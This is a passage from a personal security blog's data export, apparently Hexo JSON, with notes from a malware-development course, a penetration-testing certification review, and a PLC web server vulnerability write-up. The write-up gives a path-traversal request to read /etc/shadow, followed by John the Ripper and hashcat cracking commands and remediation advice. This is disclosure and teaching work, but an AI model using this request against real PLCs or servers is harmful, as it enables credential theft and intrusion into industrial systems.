calc<br>Text, data and resources sections in PE files are places to store shellcode&#x2F;payload</p>\n<p>Videos 7-8:<br>7: learned  about storing payloads in the text section of executables by storing shellcode in local variables. stepped through the instructions with x64dbg to further cement understanding of allocating memory for shellcode, making it readable and executable and finally creating a thread to execute it</p>\n<p>8: storing payloads in the data section of the executable by initializing them as global variables instead. otherwise the process of allocating memory and otherwise is unchanged<br>(learn more cpp and interacting with windows api and understand virtualalloc in more depth)</p>\n<p>Thanks for reading! </p>\n","excerpt":"","more":"<h2 id=\"Thoughts\"><a href=\"#Thoughts\" class=\"headerlink\" title=\"Thoughts\"></a>Thoughts</h2><p>Overall it seems to be a very well put together, useful, and informative. </p>\n<p>Currently my skills with C++ aren’t up to snuff to keep up with so I will be returning to this once I have more knowledge under my belt.<br>Here are some rough notes taken while attempting to get though the intro to the course.</p>\n<h2 id=\"Notes\"><a href=\"#Notes\" class=\"headerlink\" title=\"Notes\"></a>Notes</h2><p>1-4 videos:<br>Learned about PE-Bear, structure of PE programs.<br>Difference between how DLL and EXE are executed and used<br>and general housekeeping, setting up the environment</p>\n<p>Videos 5-6:<br>compiling CPP code through powershell script<br>compiling CPP code with DLL main function to compile code into a DLL<br>exploring output in process hacker<br>DLLs cannot live in memory alone, rundll32 allows you to, also dumpbin important<br>droppers, where to store payloads within PE files. Have shellcode that launches calc<br>Text, data and resources sections in PE files are places to store shellcode&#x2F;payload</p>\n<p>Videos 7-8:<br>7: learned  about storing payloads in the text section of executables by storing shellcode in local variables. stepped through the instructions with x64dbg to further cement understanding of allocating memory for shellcode, making it readable and executable and finally creating a thread to execute it</p>\n<p>8: storing payloads in the data section of the executable by initializing them as global variables instead. otherwise the process of allocating memory and otherwise is unchanged<br>(learn more cpp and interacting with windows api and understand virtualalloc in more depth)</p>\n<p>Thanks for reading! </p>\n"},{"layout":"single","title":"Vulnerable Web App Video Links","date":"2022-09-22T04:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":"\nLinks for the video posted on my youtube channel! Check it out.  \nhttps://www.youtube.com/watch?v=F8zlx5d4UyA  \n\n\nResources:  \n  \nhttps://www.vulnerablewebapps.org/  \nhttps://github.com/s4n7h0/xvwa  \nhttps://github.com/rapid7/hackazon  \nhttp://www.itsecgames.com/  \nhttps://github.com/digininja/DVWA  \nhttps://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10  \nhttps://elements.heroku.com/buttons/bkimminich/juice-shop  \nhttps://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf  \n\n","source":"_posts/2022-9-22-Vulnerable-Web-Apps-Overview.md","raw":"---\nlayout: single\ntitle:  Vulnerable Web App Video Links\ndate: 2022-9-22\nclasses: wide\nheader:\n  teaser: \ntags:\n  - ctf\n  - Video\n---\n\nLinks for the video posted on my youtube channel! Check it out.  \nhttps://www.youtube.com/watch?v=F8zlx5d4UyA  \n\n\nResources:  \n  \nhttps://www.vulnerablewebapps.org/  \nhttps://github.com/s4n7h0/xvwa  \nhttps://github.com/rapid7/hackazon  \nhttp://www.itsecgames.com/  \nhttps://github.com/digininja/DVWA  \nhttps://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10  \nhttps://elements.heroku.com/buttons/bkimminich/juice-shop  \nhttps://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf  \n\n","slug":"2022-9-22-Vulnerable-Web-Apps-Overview","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5la000nm3cpbqc61q5v","content":"<p>Links for the video posted on my youtube channel! Check it out.<br><a href=\"https://www.youtube.com/watch?v=F8zlx5d4UyA\">https://www.youtube.com/watch?v=F8zlx5d4UyA</a>  </p>\n<p>Resources:  </p>\n<p><a href=\"https://www.vulnerablewebapps.org/\">https://www.vulnerablewebapps.org/</a><br><a href=\"https://github.com/s4n7h0/xvwa\">https://github.com/s4n7h0/xvwa</a><br><a href=\"https://github.com/rapid7/hackazon\">https://github.com/rapid7/hackazon</a><br><a href=\"http://www.itsecgames.com/\">http://www.itsecgames.com/</a><br><a href=\"https://github.com/digininja/DVWA\">https://github.com/digininja/DVWA</a><br><a href=\"https://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10\">https://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10</a><br><a href=\"https://elements.heroku.com/buttons/bkimminich/juice-shop\">https://elements.heroku.com/buttons/bkimminich/juice-shop</a><br><a href=\"https://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf\">https://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf</a>  </p>\n","excerpt":"","more":"<p>Links for the video posted on my youtube channel! Check it out.<br><a href=\"https://www.youtube.com/watch?v=F8zlx5d4UyA\">https://www.youtube.com/watch?v=F8zlx5d4UyA</a>  </p>\n<p>Resources:  </p>\n<p><a href=\"https://www.vulnerablewebapps.org/\">https://www.vulnerablewebapps.org/</a><br><a href=\"https://github.com/s4n7h0/xvwa\">https://github.com/s4n7h0/xvwa</a><br><a href=\"https://github.com/rapid7/hackazon\">https://github.com/rapid7/hackazon</a><br><a href=\"http://www.itsecgames.com/\">http://www.itsecgames.com/</a><br><a href=\"https://github.com/digininja/DVWA\">https://github.com/digininja/DVWA</a><br><a href=\"https://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10\">https://github.com/vavkamil/awesome-vulnerable-apps#OWASP-Top-10</a><br><a href=\"https://elements.heroku.com/buttons/bkimminich/juice-shop\">https://elements.heroku.com/buttons/bkimminich/juice-shop</a><br><a href=\"https://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf\">https://grietsdc.in/downloads/nasscom161121/pwning%20-%20JuiceShop.pdf</a>  </p>\n"},{"layout":"single","title":"TCM PNPT Certification Review","date":"2022-09-19T04:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":"TL;DR/Summary: \n\nThe Practical Network Penetration Tester certification exam from TCM Security is a simulated 5-day penetration test with the intent of proving a baseline level of offensive security prowess for the student. The exam environment is varied, primarily consisting of Windows machines but also contains Linux hosts. 2 additional days were given for reporting on remediation of vulnerabilities found and compliance steps to be taken. The goal of the hands on 5-day exam portion is to assess the entire environment for any and all vulnerabilities, but to pass, at a minimum you must gain administrative access to the domain controller. To be successful in the exam I would recommend studying the following topics as they were essential to passing.\n\n```\n- OSINT (Open-source intelligence collection and analysis)\n- Active Directory Fundamentals\n- Active Directory Attacks (LLMNR Poisoning, NTLM Relay Attacks, Kerberoasting, IPv6 attacks)\n- Antivirus Evasion\n- Password Spraying, Credential Stuffing, Password Cracking\n- Enumeration and Exploitation of Web Applications\n- Lateral and Vertical pivoting through networks\n```\n# The Longer Version\n\nMy background:\n\nI came into this exam as someone who has been studying penetration testing and offensive security for several years as a hobbyist and recently as a professional. This certification reinforced a lot of what has been harder to practice and model in my own home lab. Coming from capture the flag competitions and research on independent targets where there’s zero-time limit, having a rigid and structured format for testing really reinforced my methodology and helped to improve my time management. Before scheduling the exam, I completed the “Practical Ethical Hacker”, “Practical Linux Privilege Escalation”, and “Practical Windows Privilege Escalation courses offered by TCM security. While I don’t think it was necessary for this certification, I felt both the privilege escalation courses were valuable.\n\nThe exam experience:\n\nAs a 5-day exam there was a clear sense of urgency to complete the exam, but I didn’t feel the need tocancel social gatherings or make exceptional changes to my schedule which was nice. I worked for a couple hours each day in bursts of an hour and taking short breaks. During the exam period you are given two environment resets if you manage to break something you weren’t meant to, or something deployed incorrectly. When I wanted a reset on my environment, I sent a request to the support email and got a ticket immediately. My request was taken care of within half an hour which I think is exceptional considering the number of emails they must get. The cyber range itself felt polished and the user machines themselves were populated with realistic enough files and programs. This emphasis on practicality and realism makes the PNPT unique in its approach.\n\nRemediation and Debrief:\n\nAs I mentioned before the exam is mimicking a real, practical penetration test on a company, so a large portion of the experience is focused on remediation and reporting. Following the 5-day testing period you are given an additional 2 days to put together a report to present to the client. On a real engagement it’s standard practice to collect screenshots, logs, and vulnerabilities found during testing to later format. This advice worked well for me on the exam and made reporting and later presenting less intimidating than it otherwise would have been. On the day of the debrief I was greeted with Heath himself who was there to listen to the path I took to exploit the domain controller and what kind of fixes should be made to it. I chose to put together a PowerPoint to better organize my thoughts and have my notes in order.\n\nWould I recommend it:\n\nI would recommend this exam and the accompanying course (PEH) to anyone looking for an intermediate certification in the offensive security space. In my opinion it would be ideal for individuals already working information technology like developers, systems administrators, and dev ops professionals. The prior experience in tinkering and outside the box thinking is a valuable skill assessing what others might have already attempted to secure. For people not previously working in those fields but have tech experience and are motivated to learn more about information security it is still achievable but expect be familiar with the fundamentals before you get to the fun stuff.\n\n\n","source":"_posts/2022-9-19-TCM-PNPT-Certification-Review.md","raw":"---\nlayout: single\ntitle:  TCM PNPT Certification Review\ndate: 2022-9-19\nclasses: wide\nheader:\n  teaser: \ntags:\n  - Certification\n---\nTL;DR/Summary: \n\nThe Practical Network Penetration Tester certification exam from TCM Security is a simulated 5-day penetration test with the intent of proving a baseline level of offensive security prowess for the student. The exam environment is varied, primarily consisting of Windows machines but also contains Linux hosts. 2 additional days were given for reporting on remediation of vulnerabilities found and compliance steps to be taken. The goal of the hands on 5-day exam portion is to assess the entire environment for any and all vulnerabilities, but to pass, at a minimum you must gain administrative access to the domain controller. To be successful in the exam I would recommend studying the following topics as they were essential to passing.\n\n```\n- OSINT (Open-source intelligence collection and analysis)\n- Active Directory Fundamentals\n- Active Directory Attacks (LLMNR Poisoning, NTLM Relay Attacks, Kerberoasting, IPv6 attacks)\n- Antivirus Evasion\n- Password Spraying, Credential Stuffing, Password Cracking\n- Enumeration and Exploitation of Web Applications\n- Lateral and Vertical pivoting through networks\n```\n# The Longer Version\n\nMy background:\n\nI came into this exam as someone who has been studying penetration testing and offensive security for several years as a hobbyist and recently as a professional. This certification reinforced a lot of what has been harder to practice and model in my own home lab. Coming from capture the flag competitions and research on independent targets where there’s zero-time limit, having a rigid and structured format for testing really reinforced my methodology and helped to improve my time management. Before scheduling the exam, I completed the “Practical Ethical Hacker”, “Practical Linux Privilege Escalation”, and “Practical Windows Privilege Escalation courses offered by TCM security. While I don’t think it was necessary for this certification, I felt both the privilege escalation courses were valuable.\n\nThe exam experience:\n\nAs a 5-day exam there was a clear sense of urgency to complete the exam, but I didn’t feel the need tocancel social gatherings or make exceptional changes to my schedule which was nice. I worked for a couple hours each day in bursts of an hour and taking short breaks. During the exam period you are given two environment resets if you manage to break something you weren’t meant to, or something deployed incorrectly. When I wanted a reset on my environment, I sent a request to the support email and got a ticket immediately. My request was taken care of within half an hour which I think is exceptional considering the number of emails they must get. The cyber range itself felt polished and the user machines themselves were populated with realistic enough files and programs. This emphasis on practicality and realism makes the PNPT unique in its approach.\n\nRemediation and Debrief:\n\nAs I mentioned before the exam is mimicking a real, practical penetration test on a company, so a large portion of the experience is focused on remediation and reporting. Following the 5-day testing period you are given an additional 2 days to put together a report to present to the client. On a real engagement it’s standard practice to collect screenshots, logs, and vulnerabilities found during testing to later format. This advice worked well for me on the exam and made reporting and later presenting less intimidating than it otherwise would have been. On the day of the debrief I was greeted with Heath himself who was there to listen to the path I took to exploit the domain controller and what kind of fixes should be made to it. I chose to put together a PowerPoint to better organize my thoughts and have my notes in order.\n\nWould I recommend it:\n\nI would recommend this exam and the accompanying course (PEH) to anyone looking for an intermediate certification in the offensive security space. In my opinion it would be ideal for individuals already working information technology like developers, systems administrators, and dev ops professionals. The prior experience in tinkering and outside the box thinking is a valuable skill assessing what others might have already attempted to secure. For people not previously working in those fields but have tech experience and are motivated to learn more about information security it is still achievable but expect be familiar with the fundamentals before you get to the fun stuff.\n\n\n","slug":"2022-9-19-TCM-PNPT-Certification-Review","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5lc000om3cpckjk4gnz","content":"<p>TL;DR&#x2F;Summary: </p>\n<p>The Practical Network Penetration Tester certification exam from TCM Security is a simulated 5-day penetration test with the intent of proving a baseline level of offensive security prowess for the student. The exam environment is varied, primarily consisting of Windows machines but also contains Linux hosts. 2 additional days were given for reporting on remediation of vulnerabilities found and compliance steps to be taken. The goal of the hands on 5-day exam portion is to assess the entire environment for any and all vulnerabilities, but to pass, at a minimum you must gain administrative access to the domain controller. To be successful in the exam I would recommend studying the following topics as they were essential to passing.</p>\n<pre><code class=\"hljs plaintext\">- OSINT (Open-source intelligence collection and analysis)\n- Active Directory Fundamentals\n- Active Directory Attacks (LLMNR Poisoning, NTLM Relay Attacks, Kerberoasting, IPv6 attacks)\n- Antivirus Evasion\n- Password Spraying, Credential Stuffing, Password Cracking\n- Enumeration and Exploitation of Web Applications\n- Lateral and Vertical pivoting through networks</code></pre>\n<h1 id=\"The-Longer-Version\"><a href=\"#The-Longer-Version\" class=\"headerlink\" title=\"The Longer Version\"></a>The Longer Version</h1><p>My background:</p>\n<p>I came into this exam as someone who has been studying penetration testing and offensive security for several years as a hobbyist and recently as a professional. This certification reinforced a lot of what has been harder to practice and model in my own home lab. Coming from capture the flag competitions and research on independent targets where there’s zero-time limit, having a rigid and structured format for testing really reinforced my methodology and helped to improve my time management. Before scheduling the exam, I completed the “Practical Ethical Hacker”, “Practical Linux Privilege Escalation”, and “Practical Windows Privilege Escalation courses offered by TCM security. While I don’t think it was necessary for this certification, I felt both the privilege escalation courses were valuable.</p>\n<p>The exam experience:</p>\n<p>As a 5-day exam there was a clear sense of urgency to complete the exam, but I didn’t feel the need tocancel social gatherings or make exceptional changes to my schedule which was nice. I worked for a couple hours each day in bursts of an hour and taking short breaks. During the exam period you are given two environment resets if you manage to break something you weren’t meant to, or something deployed incorrectly. When I wanted a reset on my environment, I sent a request to the support email and got a ticket immediately. My request was taken care of within half an hour which I think is exceptional considering the number of emails they must get. The cyber range itself felt polished and the user machines themselves were populated with realistic enough files and programs. This emphasis on practicality and realism makes the PNPT unique in its approach.</p>\n<p>Remediation and Debrief:</p>\n<p>As I mentioned before the exam is mimicking a real, practical penetration test on a company, so a large portion of the experience is focused on remediation and reporting. Following the 5-day testing period you are given an additional 2 days to put together a report to present to the client. On a real engagement it’s standard practice to collect screenshots, logs, and vulnerabilities found during testing to later format. This advice worked well for me on the exam and made reporting and later presenting less intimidating than it otherwise would have been. On the day of the debrief I was greeted with Heath himself who was there to listen to the path I took to exploit the domain controller and what kind of fixes should be made to it. I chose to put together a PowerPoint to better organize my thoughts and have my notes in order.</p>\n<p>Would I recommend it:</p>\n<p>I would recommend this exam and the accompanying course (PEH) to anyone looking for an intermediate certification in the offensive security space. In my opinion it would be ideal for individuals already working information technology like developers, systems administrators, and dev ops professionals. The prior experience in tinkering and outside the box thinking is a valuable skill assessing what others might have already attempted to secure. For people not previously working in those fields but have tech experience and are motivated to learn more about information security it is still achievable but expect be familiar with the fundamentals before you get to the fun stuff.</p>\n","excerpt":"","more":"<p>TL;DR&#x2F;Summary: </p>\n<p>The Practical Network Penetration Tester certification exam from TCM Security is a simulated 5-day penetration test with the intent of proving a baseline level of offensive security prowess for the student. The exam environment is varied, primarily consisting of Windows machines but also contains Linux hosts. 2 additional days were given for reporting on remediation of vulnerabilities found and compliance steps to be taken. The goal of the hands on 5-day exam portion is to assess the entire environment for any and all vulnerabilities, but to pass, at a minimum you must gain administrative access to the domain controller. To be successful in the exam I would recommend studying the following topics as they were essential to passing.</p>\n<pre><code class=\"hljs plaintext\">- OSINT (Open-source intelligence collection and analysis)\n- Active Directory Fundamentals\n- Active Directory Attacks (LLMNR Poisoning, NTLM Relay Attacks, Kerberoasting, IPv6 attacks)\n- Antivirus Evasion\n- Password Spraying, Credential Stuffing, Password Cracking\n- Enumeration and Exploitation of Web Applications\n- Lateral and Vertical pivoting through networks</code></pre>\n<h1 id=\"The-Longer-Version\"><a href=\"#The-Longer-Version\" class=\"headerlink\" title=\"The Longer Version\"></a>The Longer Version</h1><p>My background:</p>\n<p>I came into this exam as someone who has been studying penetration testing and offensive security for several years as a hobbyist and recently as a professional. This certification reinforced a lot of what has been harder to practice and model in my own home lab. Coming from capture the flag competitions and research on independent targets where there’s zero-time limit, having a rigid and structured format for testing really reinforced my methodology and helped to improve my time management. Before scheduling the exam, I completed the “Practical Ethical Hacker”, “Practical Linux Privilege Escalation”, and “Practical Windows Privilege Escalation courses offered by TCM security. While I don’t think it was necessary for this certification, I felt both the privilege escalation courses were valuable.</p>\n<p>The exam experience:</p>\n<p>As a 5-day exam there was a clear sense of urgency to complete the exam, but I didn’t feel the need tocancel social gatherings or make exceptional changes to my schedule which was nice. I worked for a couple hours each day in bursts of an hour and taking short breaks. During the exam period you are given two environment resets if you manage to break something you weren’t meant to, or something deployed incorrectly. When I wanted a reset on my environment, I sent a request to the support email and got a ticket immediately. My request was taken care of within half an hour which I think is exceptional considering the number of emails they must get. The cyber range itself felt polished and the user machines themselves were populated with realistic enough files and programs. This emphasis on practicality and realism makes the PNPT unique in its approach.</p>\n<p>Remediation and Debrief:</p>\n<p>As I mentioned before the exam is mimicking a real, practical penetration test on a company, so a large portion of the experience is focused on remediation and reporting. Following the 5-day testing period you are given an additional 2 days to put together a report to present to the client. On a real engagement it’s standard practice to collect screenshots, logs, and vulnerabilities found during testing to later format. This advice worked well for me on the exam and made reporting and later presenting less intimidating than it otherwise would have been. On the day of the debrief I was greeted with Heath himself who was there to listen to the path I took to exploit the domain controller and what kind of fixes should be made to it. I chose to put together a PowerPoint to better organize my thoughts and have my notes in order.</p>\n<p>Would I recommend it:</p>\n<p>I would recommend this exam and the accompanying course (PEH) to anyone looking for an intermediate certification in the offensive security space. In my opinion it would be ideal for individuals already working information technology like developers, systems administrators, and dev ops professionals. The prior experience in tinkering and outside the box thinking is a valuable skill assessing what others might have already attempted to secure. For people not previously working in those fields but have tech experience and are motivated to learn more about information security it is still achievable but expect be familiar with the fundamentals before you get to the fun stuff.</p>\n"},{"layout":"single","title":"PLC Web Server Arbitrary File Download","date":"2023-02-26T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":"\nIntroduction\n---\nIn this post I'll go over a simple arbitrary file download vulnerability I found on the webserver of a commonly used PLC. \nTo avoid disclosing the vulnerability to the public before a CVE has been formally given, I won't give specific details of the brand, model, and software this exploit applies to. \n\nThis can be leveraged to gain root access on the underlying OS and implant backdoors, further traverse through the network, interrupt the normal operation of critical infrastructure, etc. \n\n\nThe basic flow of the exploiting the vuln goes as follows:\n\n1. Login to the web server with credentials for the admin user on the PLC.\n2. Find/enable OpenVPN file download and upload.\n3. Intercept the download.php request and replace the openvpn file it's requesting with any arbitrary file\n4. Profit?\n\nExploitation\n---\nIntercepting the request to download the OpenVPN config and  looking further we can see that the path to the file we're downloading is communicated to us. We can attempt to change the path to a file that we would like to download instead. \n```\nGET /XXX/php/file_transfer/download.php?download=/tmp/vpncfg-out/openvpn.conf&csrf=yourCSRFtoken HTTP/1.1\nHost: 192.168.1.87\nCookie: REDACTED\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: iframe\nReferer: https://192.168.1.87/XXX/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n```\n\nTo:\n`GET /XXX/php/file_transfer/download.php?download=/etc/shadow&csrf=yourCSRFtoken HTTP/1.1`\n\nWe can leverage this to download the /etc/shadow and /etc/password file, unshadow them, then crack the passwords to login as root via SSH and/or reuse the credentials somewhere else in the network.\n\nBonus Points\n---\n#### Using John The Ripper:\n```\nunshadow passwd shadow\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt\n```\n\n#### Using Hashcat:\n\nWith hashcat we don't have to unshadow the files to match the users to the the hashes like John the ripper. \nFeed Hashcat the shadow file with -m specified for  `1800 | sha512crypt $6$, SHA512 (Unix) | Operating System`\n```\nhashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou1.txt\n```\n\n\nRemediation\n---\nThe vulnerable code can be found in the download.php file. \n```\nif (isset($_GET['download'])) {\n    $downloadPath = $_GET['download'];\n```\n\nWhat could be done to make this more secure is:\n1. Check if the file is allowed to be accessed before downloading. Whitelisting acceptable file paths for example.\n2. Remove the ability for users to modify the path of the file downloaded.\n3. Make sure that the web server user has the least amount of privilege necessary to accomplish the task.\n\nConclusion\n---\nI will come out with a PoC script to automate exploitation of the vuln along with more details when the vuln is officially allowed to be disclosed. With proper protections put in place this vuln shouldn't even be possible to execute anyway. \n","source":"_posts/2023-2-25-PLC-Web-Server-Authenticated-Arbitrary-File-Download.md","raw":"---\nlayout: single\ntitle: PLC Web Server Arbitrary File Download\ndate: 2023-2-26\nclasses: wide\nheader:\n  teaser: \ntags:\n  - CVE\n  - Web\n---\n\nIntroduction\n---\nIn this post I'll go over a simple arbitrary file download vulnerability I found on the webserver of a commonly used PLC. \nTo avoid disclosing the vulnerability to the public before a CVE has been formally given, I won't give specific details of the brand, model, and software this exploit applies to. \n\nThis can be leveraged to gain root access on the underlying OS and implant backdoors, further traverse through the network, interrupt the normal operation of critical infrastructure, etc. \n\n\nThe basic flow of the exploiting the vuln goes as follows:\n\n1. Login to the web server with credentials for the admin user on the PLC.\n2. Find/enable OpenVPN file download and upload.\n3. Intercept the download.php request and replace the openvpn file it's requesting with any arbitrary file\n4. Profit?\n\nExploitation\n---\nIntercepting the request to download the OpenVPN config and  looking further we can see that the path to the file we're downloading is communicated to us. We can attempt to change the path to a file that we would like to download instead. \n```\nGET /XXX/php/file_transfer/download.php?download=/tmp/vpncfg-out/openvpn.conf&csrf=yourCSRFtoken HTTP/1.1\nHost: 192.168.1.87\nCookie: REDACTED\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: iframe\nReferer: https://192.168.1.87/XXX/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n```\n\nTo:\n`GET /XXX/php/file_transfer/download.php?download=/etc/shadow&csrf=yourCSRFtoken HTTP/1.1`\n\nWe can leverage this to download the /etc/shadow and /etc/password file, unshadow them, then crack the passwords to login as root via SSH and/or reuse the credentials somewhere else in the network.\n\nBonus Points\n---\n#### Using John The Ripper:\n```\nunshadow passwd shadow\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt\n```\n\n#### Using Hashcat:\n\nWith hashcat we don't have to unshadow the files to match the users to the the hashes like John the ripper. \nFeed Hashcat the shadow file with -m specified for  `1800 | sha512crypt $6$, SHA512 (Unix) | Operating System`\n```\nhashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou1.txt\n```\n\n\nRemediation\n---\nThe vulnerable code can be found in the download.php file. \n```\nif (isset($_GET['download'])) {\n    $downloadPath = $_GET['download'];\n```\n\nWhat could be done to make this more secure is:\n1. Check if the file is allowed to be accessed before downloading. Whitelisting acceptable file paths for example.\n2. Remove the ability for users to modify the path of the file downloaded.\n3. Make sure that the web server user has the least amount of privilege necessary to accomplish the task.\n\nConclusion\n---\nI will come out with a PoC script to automate exploitation of the vuln along with more details when the vuln is officially allowed to be disclosed. With proper protections put in place this vuln shouldn't even be possible to execute anyway. \n","slug":"2023-2-25-PLC-Web-Server-Authenticated-Arbitrary-File-Download","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5le000qm3cp5ofegjm0","content":"<h2 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h2><p>In this post I’ll go over a simple arbitrary file download vulnerability I found on the webserver of a commonly used PLC.<br>To avoid disclosing the vulnerability to the public before a CVE has been formally given, I won’t give specific details of the brand, model, and software this exploit applies to. </p>\n<p>This can be leveraged to gain root access on the underlying OS and implant backdoors, further traverse through the network, interrupt the normal operation of critical infrastructure, etc. </p>\n<p>The basic flow of the exploiting the vuln goes as follows:</p>\n<ol>\n<li>Login to the web server with credentials for the admin user on the PLC.</li>\n<li>Find&#x2F;enable OpenVPN file download and upload.</li>\n<li>Intercept the download.php request and replace the openvpn file it’s requesting with any arbitrary file</li>\n<li>Profit?</li>\n</ol>\n<h2 id=\"Exploitation\"><a href=\"#Exploitation\" class=\"headerlink\" title=\"Exploitation\"></a>Exploitation</h2><p>Intercepting the request to download the OpenVPN config and  looking further we can see that the path to the file we’re downloading is communicated to us. We can attempt to change the path to a file that we would like to download instead. </p>\n<pre><code class=\"hljs plaintext\">GET /XXX/php/file_transfer/download.php?download=/tmp/vpncfg-out/openvpn.conf&amp;csrf=yourCSRFtoken HTTP/1.1\nHost: 192.168.1.87\nCookie: REDACTED\nSec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: iframe\nReferer: https://192.168.1.87/XXX/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close</code></pre>\n\n<p>To:<br><code>GET /XXX/php/file_transfer/download.php?download=/etc/shadow&amp;csrf=yourCSRFtoken HTTP/1.1</code></p>\n<p>We can leverage this to download the &#x2F;etc&#x2F;shadow and &#x2F;etc&#x2F;password file, unshadow them, then crack the passwords to login as root via SSH and&#x2F;or reuse the credentials somewhere else in the network.</p>\n<h2 id=\"Bonus-Points\"><a href=\"#Bonus-Points\" class=\"headerlink\" title=\"Bonus Points\"></a>Bonus Points</h2><h4 id=\"Using-John-The-Ripper\"><a href=\"#Using-John-The-Ripper\" class=\"headerlink\" title=\"Using John The Ripper:\"></a>Using John The Ripper:</h4><pre><code class=\"hljs plaintext\">unshadow passwd shadow\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt</code></pre>\n\n<h4 id=\"Using-Hashcat\"><a href=\"#Using-Hashcat\" class=\"headerlink\" title=\"Using Hashcat:\"></a>Using Hashcat:</h4><p>With hashcat we don’t have to unshadow the files to match the users to the the hashes like John the ripper.<br>Feed Hashcat the shadow file with -m specified for  <code>1800 | sha512crypt $6$, SHA512 (Unix) | Operating System</code></p>\n<pre><code class=\"hljs plaintext\">hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou1.txt</code></pre>\n\n\n<h2 id=\"Remediation\"><a href=\"#Remediation\" class=\"headerlink\" title=\"Remediation\"></a>Remediation</h2><p>The vulnerable code can be found in the download.php file. </p>\n<pre><code class=\"hljs plaintext\">if (isset($_GET[&#x27;download&#x27;])) &#123;\n    $downloadPath = $_GET[&#x27;download&#x27;];</code></pre>\n\n<p>What could be done to make this more secure is:</p>\n<ol>\n<li>Check if the file is allowed to be accessed before downloading. Whitelisting acceptable file paths for example.</li>\n<li>Remove the ability for users to modify the path of the file downloaded.</li>\n<li>Make sure that the web server user has the least amount of privilege necessary to accomplish the task.</li>\n</ol>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>I will come out with a PoC script to automate exploitation of the vuln along with more details when the vuln is officially allowed to be disclosed. With proper protections put in place this vuln shouldn’t even be possible to execute anyway. </p>\n","excerpt":"","more":"<h2 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h2><p>In this post I’ll go over a simple arbitrary file download vulnerability I found on the webserver of a commonly used PLC.<br>To avoid disclosing the vulnerability to the public before a CVE has been formally given, I won’t give specific details of the brand, model, and software this exploit applies to. </p>\n<p>This can be leveraged to gain root access on the underlying OS and implant backdoors, further traverse through the network, interrupt the normal operation of critical infrastructure, etc. </p>\n<p>The basic flow of the exploiting the vuln goes as follows:</p>\n<ol>\n<li>Login to the web server with credentials for the admin user on the PLC.</li>\n<li>Find&#x2F;enable OpenVPN file download and upload.</li>\n<li>Intercept the download.php request and replace the openvpn file it’s requesting with any arbitrary file</li>\n<li>Profit?</li>\n</ol>\n<h2 id=\"Exploitation\"><a href=\"#Exploitation\" class=\"headerlink\" title=\"Exploitation\"></a>Exploitation</h2><p>Intercepting the request to download the OpenVPN config and  looking further we can see that the path to the file we’re downloading is communicated to us. We can attempt to change the path to a file that we would like to download instead. </p>\n<pre><code class=\"hljs plaintext\">GET /XXX/php/file_transfer/download.php?download=/tmp/vpncfg-out/openvpn.conf&amp;csrf=yourCSRFtoken HTTP/1.1\nHost: 192.168.1.87\nCookie: 